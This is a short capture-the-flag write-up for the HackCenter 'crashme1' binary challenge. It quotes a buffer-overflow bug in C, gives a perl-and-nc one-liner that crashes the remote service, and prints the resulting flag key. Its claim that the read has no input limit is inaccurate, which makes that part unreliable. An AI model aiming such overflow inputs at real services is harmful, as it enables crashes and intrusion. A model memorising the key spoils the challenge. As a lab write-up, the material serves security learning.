# HackCenter Engima2017 crashme1

**Category:** Binary **Points:** 25 

**Description:**

> A vulnerable service is running on enigma2017.hackcenter.com:5813. If you can crash it, it will yield the key. Source is available at crashme1.c.

## Write-Up

The provided code shows us the following interesting items:

```
  #define BUFSIZE 64u 
  ...
  printf("What is your name?\n");
  fflush(stdout);
  len = read(STDIN_FILENO,buf.buf,BUFSIZE+8);
  
```

The program is creating a 64 byte unsigned buffer, reading a user's input and storing
it into the buffer. The read allows for 8 bytes of additional information past the
buffer size, but doesn't have any limitations for how much a user can input. If we attempt
to load in 73 characters, it will overflow and return our flag.

```
$ perl -e 'print "A"x73;' | nc enigma2017.hackcenter.com 5813
What is your name?                                                             
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
SEGMENTATION FAULT                                                             
Your key is 79fa02be8d8689016ec93af8ee8bdaac
```








